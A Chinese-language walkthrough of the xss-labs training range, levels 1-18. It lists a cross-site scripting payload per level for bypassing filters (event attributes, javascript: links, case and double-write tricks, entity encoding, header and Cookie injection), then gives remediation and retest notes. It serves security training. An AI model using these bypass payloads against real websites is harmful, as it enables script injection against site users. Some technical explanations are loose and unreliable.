# xss-labs 靶场通关攻略（Level 1-18）

**靶场**：xss-labs（本地授权）
**安全等级**：Low（默认）
**时间**：2025.12

> **整篇都是个人通关记录**——每一关给出输入、源码分析、Payload、过关截图。

## Level 1（无过滤）

```html
<script>alert(111)</script>
```

服务器未做任何过滤直接输出。

## Level 2（双引号闭合 + HTML 实体化）

源码中 `<input value="$str">`，搜索框已实体化但闭合点未处理。

```html
"><script>alert(111)</script><!--
```

## Level 3（实体化 + 单引号）

```html
' onfocus='alert(111)
```

事件属性绕过实体化。

## Level 4（尖括号过滤）

```html
" onfocus="alert(111)
```

源码过滤 `<` `>`，事件属性不受影响。

## Level 5（on 替换为 o_n）

```html
"> <a href="javascript:alert(111)">
```

绕过 on* 事件过滤，使用 href + javascript 协议。

## Level 6（大小写绕过）

```html
"> <a Href="javascript:alert(111)">
```

href 大小写未严格匹配。

## Level 7（双写绕过）

```html
"> <a hrehreff="javascrascriptipt:alert(111)">
```

过滤一次，双写还原。

## Level 8（href 自动 unicode 解码）

```html
javascript:alert(111)
```

源码过滤协议头但 href 自动 URL 解码，可 unicode 编码绕过：

```html
&#106;avascript:alert(111)
```

## Level 9（标签内注释）

```html
javascript:alert(111)//http://
```

检测是否包含 `http://`，注释符 + 合法 URL 拼后缀绕过。

## Level 10（隐藏参数）

源码中 keyword 过滤但还有 `t_sort` 隐藏参数：

```html
t_sort=" onfocus="alert(111)" type="text
```

## Level 11（Referer 注入）

Referer 头被直接嵌入 HTML 某属性：

```
Referer: " onfocus="alert(111)" type="text
```

## Level 12（User-Agent 注入）

```
User-Agent: " onfocus="alert(111)" type="text
```

## Level 13（Cookie 注入）

```
Cookie: user=" onfocus="alert(111)" type="text
```

## Level 14（ng-include + iframe）

```html
<iframe src="level14.php?keyword=%22%20onfocus=%22alert(111)%22%20type=%22text%22">
```

通过 ng-include 引入 level14 自身 URL。

## Level 15（angularjs ng-include）

```html
'><img src=x onerror=alert(1)>'
```

ng-include 加载文件，绕过注释。

## Level 16（空格过滤 → 换行绕过）

源码过滤空格，用 `%0a` 换行绕过：

```html
<img%0asrc=x%0aonerror=alert(1)>
```

## Level 17-18（embed/onmouseover）

```html
onmouseover=alert(1)
```

embed 标签事件属性绕过。

---

## 修复建议（所有关通用）

1. **输出编码**：`htmlspecialchars($str, ENT_QUOTES, 'UTF-8')`
2. CSP 头：`Content-Security-Policy: default-src 'self'; script-src 'self'`
3. 输入白名单（限制可输入字符）
4. 对 Referer / User-Agent / Cookie 字段**不要回显**到 HTML

## 复测

- 上述每关 Payload 在 `htmlspecialchars` 处理后全部失效
- CSP 加 `script-src 'self'` 后，inline script 也无法执行
